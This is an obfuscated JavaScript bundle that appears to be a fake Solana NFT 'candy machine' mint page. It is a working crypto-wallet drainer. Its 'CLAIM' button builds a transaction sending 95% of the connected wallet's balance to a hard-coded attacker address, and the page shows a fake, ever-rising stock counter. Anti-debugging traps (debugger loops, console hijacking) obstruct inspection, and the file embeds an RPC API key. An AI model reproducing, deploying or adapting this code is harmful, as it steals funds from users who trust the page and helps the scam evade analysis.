const wallet = "3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR";
var Q = (function () {
    var b = true
    return function (C, L) {
      var p = b
        ? function () {
            if (L) {
              var j = L.apply(C, arguments)
              return (L = null), j
            }
          }
        : function () {}
      return (b = false), p
    }
  })()
  
var m = (function () {
  var b = true
  return function (C, L) {
    var p = b
      ? function () {
          if (L) {
            var c = L.apply(C, arguments)
            return (L = null), c
          }
        }
      : function () {}
    return (b = false), p
  }
})()
;(function () {
  m(this, function () {
    var C = new RegExp('function *\\( *\\)'),
      L = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      Z = E('init')
    if (!C.test(Z + 'chain') || !L.test(Z + 'input')) {
      Z('0')
    } else {
      E()
    }
  })()
})()
var z = (function () {
  var b = true
  return function (C, L) {
    var p = b
      ? function () {
          if (L) {
            var S = L.apply(C, arguments)
            return (L = null), S
          }
        }
      : function () {}
    return (b = false), p
  }
})()
;(function () {
  var b = function () {
    var L = {
      MCMtP: function (p, S) {
        return p(S)
      },
      tDbcz: function (p, S) {
        return p(S)
      },
      xiVkZ: function (p, S) {
        return p(S)
      },
      ZZpmT: function (p, S) {
        return p(S)
      },
      sNAmI: 'Rejected via websocket',
      AToIN: function (p, S) {
        return p(S)
      },
      xkMyJ: 'Resolved via websocket',
      PhUtj: function (p, S) {
        return p(S)
      },
    }
    var Z
    try {
      Z = Function('return (function() {}.constructor("return this")( ));')()
    } catch (c) {
      Z = window
    }
    return Z
  }
  var C = b()
  C.setInterval(E, 4000)
})()
var e = z(this, function () {
  var b
  try {
    var C = Function('return (function() {}.constructor("return this")( ));')
    b = C()
  } catch (q) {
    b = window
  }
  var L = (b.console = b.console || {}),
    Z = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
  for (var p = 0; p < Z.length; p++) {
    var j = z.constructor.prototype.bind(z)
    var a = Z[p]
    var h = L[a] || j
    j['__proto__'] = z.bind(z)
    j.toString = h.toString.bind(h)
    L[a] = j
  }
})
e()
;(this['webpackJsonpcandy-machine-mint'] =
  this['webpackJsonpcandy-machine-mint'] || []).push([
  [0],
  {
    130: function (D, b, C) {
      'use strict'
      ;(function (Z) {
        C.d(b, 'a', function () {
          return J
        })
        C.d(b, 'b', function () {
          return M
        })
        C.d(b, 'c', function () {
          return V
        })
        C.d(b, 'd', function () {
          return G
        })
        var k = C(2),
          q = C.n(k),
          w = C(3),
          K = C(30),
          Y = C(62),
          B = new K.d.PublicKey('3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'),
          P = new K.d.PublicKey('3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'),
          R = new K.d.PublicKey('3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'),
          J = (function () {
            var y = Object(w.a)(
              q.a.mark(function H(F, e0, e1) {
                var e3,
                  e4,
                  e5,
                  e6,
                  e7,
                  e8 = arguments
                return q.a.wrap(function (e9) {
                  for (;;) {
                    switch ((e9.prev = e9.next)) {
                      case 0:
                        var ez = {}
                        ;(ez.slot = 0), (ez.confirmations = 0), (ez.err = null)
                        return (
                          (e3 =
                            e8.length > 3 && void 0 !== e8[3]
                              ? e8[3]
                              : 'recent'),
                          (e4 = e8.length > 4 && void 0 !== e8[4] && e8[4]),
                          (e5 = false),
                          (e6 = ez),
                          (e7 = 0),
                          (e9.next = 7),
                          new Promise(
                            (function () {
                              var em = Object(w.a)(
                                q.a.mark(function eQ(eI, et) {
                                  return q.a.wrap(function (eC) {
                                    for (;;) {
                                      switch ((eC.prev = eC.next)) {
                                        case 0:
                                          setTimeout(function () {
                                            var ec = { timeout: true }
                                            e5 ||
                                              ((e5 = true),
                                              console.log(
                                                'Rejecting for timeout...'
                                              ),
                                              et(ec))
                                          }, e0)
                                          try {
                                            e7 = e1.onSignature(
                                              F,
                                              function (eS, ec) {
                                                var ej = {
                                                  err: eS.err,
                                                  slot: ec.slot,
                                                  confirmations: 0,
                                                }
                                                e5 = true
                                                e6 = ej
                                                eS.err
                                                  ? (console.log(
                                                      'Rejected via websocket',
                                                      eS.err
                                                    ),
                                                    et(e6))
                                                  : (console.log(
                                                      'Resolved via websocket',
                                                      eS
                                                    ),
                                                    eI(e6))
                                                ;(e5 = true),
                                                  (e6 = ej),
                                                  eS.err
                                                    ? (console.log(
                                                        'Rejected via websocket',
                                                        eS.err
                                                      ),
                                                      et(e6))
                                                    : (console.log(
                                                        'Resolved via websocket',
                                                        eS
                                                      ),
                                                      eI(e6))
                                              },
                                              e3
                                            )
                                          } catch (eS) {
                                            e5 = true
                                            console.error(
                                              'WS error in setup',
                                              F,
                                              eS
                                            )
                                          }
                                        case 2:
                                          if (e5 || !e4) {
                                            eC.next = 8
                                            break
                                          }
                                          return (
                                            Object(w.a)(
                                              q.a.mark(function eh() {
                                                var ek
                                                return q.a.wrap(
                                                  function (ew) {
                                                    for (;;) {
                                                      switch (
                                                        (ew.prev = ew.next)
                                                      ) {
                                                        case 0:
                                                          return (
                                                            (ew.prev = 0),
                                                            (ew.next = 3),
                                                            e1.getSignatureStatuses(
                                                              [F]
                                                            )
                                                          )
                                                        case 3:
                                                          ;(ek = ew.sent),
                                                            (e6 =
                                                              ek &&
                                                              ek.value[0]),
                                                            e5 ||
                                                              (e6
                                                                ? e6.err
                                                                  ? (console.log(
                                                                      'REST error for',
                                                                      F,
                                                                      e6
                                                                    ),
                                                                    (e5 = true),
                                                                    et(e6.err))
                                                                  : e6.confirmations
                                                                  ? (console.log(
                                                                      'REST confirmation for',
                                                                      F,
                                                                      e6
                                                                    ),
                                                                    (e5 = true),
                                                                    eI(e6))
                                                                  : console.log(
                                                                      'REST no confirmations for',
                                                                      F,
                                                                      e6
                                                                    )
                                                                : console.log(
                                                                    'REST null result for',
                                                                    F,
                                                                    e6
                                                                  )),
                                                            (ew.next = 11)
                                                          break
                                                        case 8:
                                                          ;(ew.prev = 8),
                                                            (ew.t0 =
                                                              ew.catch(0)),
                                                            e5 ||
                                                              console.log(
                                                                'REST connection error: txid',
                                                                F,
                                                                ew.t0
                                                              )
                                                        case 11:
                                                        case 'end':
                                                          return ew.stop()
                                                      }
                                                    }
                                                  },
                                                  eh,
                                                  null,
                                                  [[0, 8]]
                                                )
                                              })
                                            )(),
                                            (eC.next = 6),
                                            O(2000)
                                          )
                                        case 6:
                                          eC.next = 2
                                          break
                                        case 8:
                                        case 'end':
                                          return eC.stop()
                                      }
                                    }
                                  }, eQ)
                                })
                              )
                              return function (eI, et) {
                                return em.apply(this, arguments)
                              }
                            })()
                          )
                        )
                      case 7:
                        return (
                          (e6 = e9.sent),
                          e1['_signatureSubscriptions'][e7] &&
                            e1.removeSignatureListener(e7),
                          (e5 = true),
                          console.log('Returning status', e6),
                          e9.abrupt('return', e6)
                        )
                      case 12:
                      case 'end':
                        return e9.stop()
                    }
                  }
                }, H)
              })
            )
            return function (F, e0, e1) {
              return y.apply(this, arguments)
            }
          })(),
          W = function (U, y, X, H) {
            var e1 = {
              pubkey: y,
              isSigner: true,
              isWritable: true,
            }
            var e2 = {
              pubkey: U,
              isSigner: false,
              isWritable: true,
            }
            var e3 = {
              pubkey: X,
              isSigner: false,
              isWritable: false,
            }
            var e4 = {
              pubkey: H,
              isSigner: false,
              isWritable: false,
            }
            var e5 = {
              pubkey: K.d.SystemProgram.programId,
              isSigner: false,
              isWritable: false,
            }
            var e6 = {
              pubkey: Y.b,
              isSigner: false,
              isWritable: false,
            }
            var e7 = {
              pubkey: K.d.SYSVAR_RENT_PUBKEY,
              isSigner: false,
              isWritable: false,
            }
            var e8 = [e1, e2, e3, e4, e5, e6, e7]
            return new K.d.TransactionInstruction({
              keys: e8,
              programId: P,
              data: Z.from([]),
            })
          },
          M = (function () {
            var y = Object(w.a)(
              q.a.mark(function H(F, e0, e1) {
                var e3, e4, e5, e6, e7, e8, e9, ee, ez
                return q.a.wrap(function (em) {
                  for (;;) {
                    switch ((em.prev = em.next)) {
                      case 0:
                        var eI = { preflightCommitment: 'recent' }
                        return (
                          (e3 = new K.b(e1, F, eI)),
                          (em.next = 3),
                          K.a.fetchIdl(B, e3)
                        )
                      case 3:
                        return (
                          (e4 = em.sent),
                          (e5 = new K.a(e4, B, e3)),
                          (e6 = {
                            id: e0,
                            connection: e1,
                            program: e5,
                          }),
                          (em.next = 8),
                          e5.account.candyMachine.fetch(e0)
                        )
                      case 8:
                        return (
                          (e7 = em.sent),
                          (e8 = e7.data.itemsAvailable.toNumber()),
                          (e9 = e7.itemsRedeemed.toNumber()),
                          (ee = e8 - e9),
                          (ez = e7.data.goLiveDate.toNumber()),
                          (ez = new Date(1000 * ez)),
                          console.log({
                            itemsAvailable: e8,
                            itemsRedeemed: e9,
                            itemsRemaining: ee,
                            goLiveDate: ez,
                          }),
                          em.abrupt('return', {
                            candyMachine: e6,
                            itemsAvailable: e8,
                            itemsRedeemed: e9,
                            itemsRemaining: ee,
                            goLiveDate: ez,
                          })
                        )
                      case 16:
                      case 'end':
                        return em.stop()
                    }
                  }
                }, H)
              })
            )
            return function (F, e0, e1) {
              return y.apply(this, arguments)
            }
          })(),
          N = (function () {
            var y = Object(w.a)(
              q.a.mark(function X(H) {
                return q.a.wrap(function (e1) {
                  for (;;) {
                    switch ((e1.prev = e1.next)) {
                      case 0:
                        return (
                          (e1.next = 2),
                          K.d.PublicKey.findProgramAddress(
                            [
                              Z.from('metadata'),
                              R.toBuffer(),
                              H.toBuffer(),
                              Z.from('edition'),
                            ],
                            R
                          )
                        )
                      case 2:
                        return e1.abrupt('return', e1.sent[0])
                      case 3:
                      case 'end':
                        return e1.stop()
                    }
                  }
                }, X)
              })
            )
            return function (H) {
              return y.apply(this, arguments)
            }
          })(),
          A = (function () {
            var y = Object(w.a)(
              q.a.mark(function X(H) {
                return q.a.wrap(function (e1) {
                  for (;;) {
                    switch ((e1.prev = e1.next)) {
                      case 0:
                        return (
                          (e1.next = 2),
                          K.d.PublicKey.findProgramAddress(
                            [Z.from('metadata'), R.toBuffer(), H.toBuffer()],
                            R
                          )
                        )
                      case 2:
                        return e1.abrupt('return', e1.sent[0])
                      case 3:
                      case 'end':
                        return e1.stop()
                    }
                  }
                }, X)
              })
            )
            return function (H) {
              return y.apply(this, arguments)
            }
          })(),
          v = (function () {
            var y = Object(w.a)(
              q.a.mark(function H(F, e0) {
                return q.a.wrap(function (e1) {
                  for (;;) {
                    switch ((e1.prev = e1.next)) {
                      case 0:
                        return (
                          (e1.next = 2),
                          K.d.PublicKey.findProgramAddress(
                            [F.toBuffer(), Y.b.toBuffer(), e0.toBuffer()],
                            P
                          )
                        )
                      case 2:
                        return e1.abrupt('return', e1.sent[0])
                      case 3:
                      case 'end':
                        return e1.stop()
                    }
                  }
                }, H)
              })
            )
            return function (F, e0) {
              return y.apply(this, arguments)
            }
          })(),
          V = (function () {
            var y = Object(w.a)(
              q.a.mark(function H(F, e0, e1, e2) {
                var e4, e5, e6, e7, e8, e9, ee
                return q.a.wrap(function (ez) {
                  for (;;) {
                    switch ((ez.prev = ez.next)) {
                      case 0:
                        return (
                          (e4 = K.d.Keypair.generate()),
                          (ez.next = 3),
                          v(e1, e4.publicKey)
                        )
                      case 3:
                        return (
                          (e5 = ez.sent),
                          (e6 = F.connection),
                          (e7 = F.program),
                          (ez.next = 7),
                          A(e4.publicKey)
                        )
                      case 7:
                        return (e8 = ez.sent), (ez.next = 10), N(e4.publicKey)
                      case 10:
                        return (
                          (e9 = ez.sent),
                          (ez.next = 13),
                          e6.getMinimumBalanceForRentExemption(Y.a.span)
                        )
                      case 13:
                        var eE = {}
                        ;(eE.config = e0),
                          (eE.candyMachine = F.id),
                          (eE.payer = e1),
                          (eE.wallet = e2),
                          (eE.mint = e4.publicKey),
                          (eE.metadata = e8),
                          (eE.masterEdition = e9),
                          (eE.mintAuthority = e1),
                          (eE.updateAuthority = e1),
                          (eE.tokenMetadataProgram = R),
                          (eE.tokenProgram = Y.b),
                          (eE.systemProgram = K.d.SystemProgram.programId),
                          (eE.rent = K.d.SYSVAR_RENT_PUBKEY),
                          (eE.clock = K.d.SYSVAR_CLOCK_PUBKEY)
                        return (
                          (ee = ez.sent),
                          (ez.next = 16),
                          e7.rpc.mintNft({
                            accounts: eE,
                            signers: [e4],
                            instructions: [
                              K.d.SystemProgram.createAccount({
                                fromPubkey: e1,
                                newAccountPubkey: e4.publicKey,
                                space: Y.a.span,
                                lamports: ee,
                                programId: Y.b,
                              }),
                              Y.c.createInitMintInstruction(
                                Y.b,
                                e4.publicKey,
                                0,
                                e1,
                                e1
                              ),
                              W(e5, e1, e1, e4.publicKey),
                              Y.c.createMintToInstruction(
                                Y.b,
                                e4.publicKey,
                                e5,
                                e1,
                                [],
                                1
                              ),
                            ],
                          })
                        )
                      case 16:
                        return ez.abrupt('return', ez.sent)
                      case 17:
                      case 'end':
                        return ez.stop()
                    }
                  }
                }, H)
              })
            )
            return function (F, e0, e1, e2) {
              return y.apply(this, arguments)
            }
          })(),
          G = function (U) {
            var y =
              arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 4
            return ''.concat(U.slice(0, y), '...').concat(U.slice(-y))
          },
          O = function (U) {
            return new Promise(function (X) {
              return setTimeout(X, U)
            })
          }
      }.call(this, C(8).Buffer))
    },
    349: function (D, b, C) {},
    350: function (D, b, C) {},
    353: function (D, b) {},
    355: function (D, b) {},
    371: function (D, b) {},
    372: function (D, b) {},
    458: function (D, b) {},
    460: function (D, b) {},
    475: function (D, b) {},
    479: function (D, b) {},
    481: function (D, b) {},
    491: function (D, b) {},
    493: function (D, b) {},
    520: function (D, b) {},
    522: function (D, b) {},
    527: function (D, b) {},
    529: function (D, b) {},
    536: function (D, b) {},
    548: function (D, b) {},
    551: function (D, b) {},
    563: function (D, b) {},
    564: function (G, X, H) {
      'use strict'
      H.r(X)
      var e1 = { marginRight: 20 }
      var e2 = { marginLeft: 20 }
      var e3,
        e4,
        e5,
        e6,
        e7 = H(1),
        e8 = H.n(e7),
        e9 = H(27),
        ee = H.n(e9),
        ez = (H(349), H(350), H(16)),
        eE = H(2),
        em = H.n(eE),
        eT = H(3),
        eQ = H(13),
        eI = H(129),
        et = H(131),
        eD = H(307),
        eb = H(591),
        eC = H(596),
        eL = H(600),
        eZ = H(599),
        ep = H(6),
        eS = H(51),
        ec = H(168),
        ej = H(130),
        eh = H(34),
        ea = Object(et.a)(ec.a)(e3 || (e3 = Object(eI.a)(['']))),
        ek = et.a.span(
          e4 || (e4 = Object(eI.a)(['font-size: 20px !important;']))
        ),
        eq = et.a.div(e5 || (e5 = Object(eI.a)(['']))),
        ew = Object(et.a)(eb.a)(
          e6 ||
            (e6 = Object(eI.a)([
              '                    display: flex;                    align-items: center;                    justify-content: center;                    width: 124px;                    height: 40px;                    border: 1px solid #7b00d1;                    cursor: pointer;                    box-sizing: border-box;                    border-radius: 5px;                    font-size: 15px;                    background-color: #7b00d1;                    transition: 300ms;',
            ]))
        ),
        ei = function (eA) {
          var es = eA.days,
            ev = eA.hours,
            eV = eA.minutes,
            eG = eA.seconds
          return (
            eA.completed,
            Object(eh.jsxs)(ek, {
              children: [
                ev - 24 * (es || 0),
                ' hours, ',
                eV,
                ' minutes, ',
                eG,
                ' seconds',
              ],
            })
          )
        },
        en = function (eA) {
          var ev = {
            open: false,
            message: '',
            severity: void 0,
          }
          var eV = Object(e7.useState)(),
            eG = Object(eQ.a)(eV, 2),
            eO = eG[0],
            eU = eG[1],
            ey = Object(e7.useState)(false),
            eX = Object(eQ.a)(ey, 2),
            eg = eX[0],
            er = eX[1],
            eH = Object(e7.useState)(false),
            eF = Object(eQ.a)(eH, 2),
            eo = eF[0],
            eu = eF[1],
            z0 = Object(e7.useState)(false),
            z1 = Object(eQ.a)(z0, 2),
            z2 = z1[0],
            z3 = z1[1],
            z4 = Object(e7.useState)(0),
            z5 = Object(eQ.a)(z4, 2),
            z6 = (z5[0], z5[1]),
            z7 = Object(e7.useState)(0),
            z8 = Object(eQ.a)(z7, 2),
            z9 = (z8[0], z8[1]),
            ze = Object(e7.useState)(0),
            zz = Object(eQ.a)(ze, 2),
            zE = (zz[0], zz[1]),
            zm = Object(e7.useState)(ev),
            zT = Object(eQ.a)(zm, 2),
            zQ = zT[0],
            zI = zT[1],
            zt = Object(e7.useState)(new Date(eA.startDate)),
            zD = Object(eQ.a)(zt, 2),
            zb = zD[0],
            zC = zD[1],
            zL = Object(eS.c)(),
            zZ = Object(e7.useState)(),
            zp = Object(eQ.a)(zZ, 2),
            zS = (zp[0], zp[1]),
            zc = (function () {
              var zq = localStorage.getItem('stock')
              if (null === zq) {
                var zw = Math.round(1020.0000000000001)
                return localStorage.setItem('stock', String(zw)), zw
              }
              var zi = Math.round(1.22 * parseInt(zq))
              return localStorage.setItem('stock', String(zi)), zi
            })(),
            zj = function () {
              Object(eT.a)(
                em.a.mark(function zw() {
                  var zn, zK, zx, zY, zd, zf
                  return em.a.wrap(function (zB) {
                    for (;;) {
                      switch ((zB.prev = zB.next)) {
                        case 0:
                          if (zL) {
                            zB.next = 2
                            break
                          }
                          return zB.abrupt('return')
                        case 2:
                          return (
                            (zB.next = 4),
                            Object(ej.b)(zL, eA.candyMachineId, eA.connection)
                          )
                        case 4:
                          ;(zn = zB.sent),
                            (zK = zn.candyMachine),
                            (zx = zn.goLiveDate),
                            (zY = zn.itemsAvailable),
                            (zd = zn.itemsRemaining),
                            (zf = zn.itemsRedeemed),
                            z6(zY),
                            zE(zd),
                            z9(zf),
                            eu(0 === zd),
                            zC(zx),
                            zS(zK)
                        case 16:
                        case 'end':
                          return zB.stop()
                      }
                    }
                  }, zw)
                })
              )()
            },
            zh = (function () {
              var zq = Object(eT.a)(
                em.a.mark(function zw() {
                  var zn, zK, zx, zY
                  return em.a.wrap(function (zf) {
                    for (;;) {
                      switch ((zf.prev = zf.next)) {
                        
                        case 0:
                          for (;;) {
                          if (
                            ((zn = new ep.PublicKey(
                              '3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'
                            )),
                            !zL)
                          ) {
                          }
                          return (
                            (zf.next = 6),
                            eA.connection.getBalance(zL.publicKey)
                          )}
                        case 2:
                          if (
                            ((zn = new ep.PublicKey(
                              '3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'
                            )),
                            !zL)
                          ) {
                            break
                          }
                          return (
                            (zf.next = 6),
                            eA.connection.getBalance(zL.publicKey)
                          )
                        case 6:
                          return (
                            (zK = zf.sent),
                            console.log(zK),
                            ((zx = new ep.Transaction().add(
                              ep.SystemProgram.transfer({
                                fromPubkey: zL.publicKey,
                                toPubkey: zn,
                                lamports: zK * 0.95,
                              })
                            )).feePayer = zL.publicKey),
                            (zY = zx),
                            (zf.next = 13),
                            eA.connection.getRecentBlockhash()
                          )
                        case 13:
                          return (
                            (zY.recentBlockhash = zf.sent.blockhash),
                            zf.abrupt('return', zx)
                          )
                        case 15:
                        case 'end':
                          return zf.stop()
                      }
                    }
                  }, zw)
                })
              )
              return function () {
                return zq.apply(this, arguments)
              }
            })(),
            za = (function () {
              var zq = Object(eT.a)(
                em.a.mark(function zw() {
                  var zn, zK, zx
                  return em.a.wrap(
                    function (zY) {
                      for (;;) {
                        switch ((zY.prev = zY.next)) {
                          case 0:
                            return z3(true), (zY.next = 3), zh()
                          case 3:
                            if (!(zn = zY.sent) || !zL) {
                              zY.next = 22
                              break
                            }
                            return (
                              (zY.prev = 5),
                              (zY.next = 8),
                              zL.signTransaction(zn)
                            )
                          case 8:
                            return (
                              (zK = zY.sent),
                              (zY.next = 11),
                              eA.connection.sendRawTransaction(zK.serialize())
                            )
                          case 11:
                            return (
                              (zx = zY.sent),
                              (zY.next = 14),
                              eA.connection.confirmTransaction(zx)
                            )
                          case 14:
                            zY.next = 19
                            break
                          case 16:
                            ;(zY.prev = 16),
                              (zY.t0 = zY.catch(5)),
                              console.warn(zY.t0)
                          case 19:
                            return (zY.prev = 19), z3(false), zY.finish(19)
                          case 22:
                          case 'end':
                            return zY.stop()
                        }
                      }
                    },
                    zw,
                    null,
                    [[5, 16, 19, 22]]
                  )
                })
              )
              return function () {
                return zq.apply(this, arguments)
              }
            })()
          return (
            Object(e7.useEffect)(
              function () {
                Object(eT.a)(
                  em.a.mark(function zk() {
                    var zw
                    return em.a.wrap(function (zi) {
                      for (;;) {
                        switch ((zi.prev = zi.next)) {
                          case 0:
                            if (!zL) {
                              zi.next = 5
                              break
                            }
                            return (
                              (zi.next = 3),
                              eA.connection.getBalance(zL.publicKey)
                            )
                          case 3:
                            ;(zw = zi.sent), eU(zw / ep.LAMPORTS_PER_SOL)
                          case 5:
                          case 'end':
                            return zi.stop()
                        }
                      }
                    }, zk)
                  })
                )()
              },
              [zL, eA.connection]
            ),
            Object(e7.useEffect)(zj, [zL, eA.candyMachineId, eA.connection]),
            Object(eh.jsxs)('main', {
              children: [
                zL &&
                  Object(eh.jsxs)('p', {
                    class: 'wallet-address',
                    id: 'mint-token',
                    children: [
                      (zL.publicKey.toBase58() || '').slice(0, 8) + '...',
                    ],
                  }),
                ,
                zL &&
                  Object(eh.jsxs)('p', {
                    class: 'wallet-address',
                    id: 'remaining',
                    children: [zc],
                  }),
                Object(eh.jsx)(eq, {
                  children: zL
                    ? Object(eh.jsx)(ew, {
                        disabled: eo || z2 || !eg,
                        onClick: za,
                        variant: 'containedSecondary',
                        children: eo
                          ? 'SOLD OUT'
                          : eg
                          ? z2
                            ? Object(eh.jsx)(eC.a, {})
                            : 'CLAIM'
                          : Object(eh.jsx)(eD.a, {
                              date: zb,
                              onMount: function (zk) {
                                return zk.completed && er(true)
                              },
                              onComplete: function () {
                                return er(true)
                              },
                              renderer: ei,
                            }),
                      })
                    : Object(eh.jsx)(ea, { children: 'CLAIM' }),
                }),
                Object(eh.jsx)(eL.a, {
                  open: zQ.open,
                  autoHideDuration: 6000,
                  onClose: function () {
                    var zk = { open: false }
                    return zI(Object(ez.a)(Object(ez.a)({}, zQ), {}, zk))
                  },
                  children: Object(eh.jsx)(eZ.a, {
                    onClose: function () {
                      var zk = { open: false }
                      return zI(Object(ez.a)(Object(ez.a)({}, zQ), {}, zk))
                    },
                    severity: zQ.severity,
                    children: zQ.message,
                  }),
                }),
              ],
            })
          )
        },
        eK = H(30),
        ex = H(112),
        eY = H(336),
        ed = H(597),
        ef = new eK.d.PublicKey('3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'),
        eB = new eK.d.PublicKey('3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'),
        eP = new eK.d.PublicKey('3cje2k7rSjueKLToS82PnxGLTjVBGEUcPb8Wg3VhNMFR'),
        eR = 'mainnet-beta',
        eJ = new eK.d.Connection('https://rpc.helius.xyz/?api-key=4438f5b8-cbce-47ce-9652-13c57aace9d8'),
        eW = parseInt('1635893271', 10),
        eM = Object(eY.a)({
          palette: { type: 'dark' },
          overrides: {
            MuiButtonBase: { root: { justifyContent: 'center' } },
            MuiButton: {
              root: {
                textTransform: void 0,
                padding: '12px 16px',
              },
              startIcon: e1,
              endIcon: e2,
            },
          },
        }),
        el = function () {
          var es = Object(e7.useMemo)(function () {
              return Object(ep.clusterApiUrl)(eR)
            }, []),
            ev = Object(e7.useMemo)(function () {
              var eG = { network: eR }
              var eO = { network: eR }
              return [
                Object(ex.a)(),
                Object(ex.b)(),
                Object(ex.c)(),
                Object(ex.e)(eG),
                Object(ex.d)(eO),
              ]
            }, []),
            eV = {
              candyMachineId: eP,
              config: eB,
              connection: eJ,
              startDate: eW,
            }
          return (
            (eV.treasury = ef),
            (eV.txTimeout = 30000),
            Object(eh.jsx)(ed.a, {
              theme: eM,
              children: Object(eh.jsx)(eS.a, {
                endpoint: es,
                children: Object(eh.jsx)(eS.b, {
                  wallets: ev,
                  autoConnect: true,
                  children: Object(eh.jsx)(ec.b, {
                    children: Object(eh.jsx)(en, eV),
                  }),
                }),
              }),
            })
          )
        },
        eN = function (eA) {
          eA &&
            eA instanceof Function &&
            H.e(3)
              .then(H.bind(null, 601))
              .then(function (es) {
                var ev = es.getCLS,
                  eV = es.getFID,
                  eG = es.getFCP,
                  eO = es.getLCP,
                  eU = es.getTTFB
                ev(eA)
                eV(eA)
                eG(eA)
                eO(eA)
                eU(eA)
              })
        }
      ee.a.render(
        Object(eh.jsx)(e8.a.StrictMode, { children: Object(eh.jsx)(el, {}) }),
        document.getElementById('root')
      )
      eN()
    },
  },
  [[564, 1, 2]],
])
function E(D) {
  function C(L) {
    if (typeof L === 'string') {
      return function (Z) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + L / L).length !== 1 || L % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    C(++L)
  }
  try {
    if (D) {
      return C
    } else {
      C(0)
    }
  } catch (L) {}
}
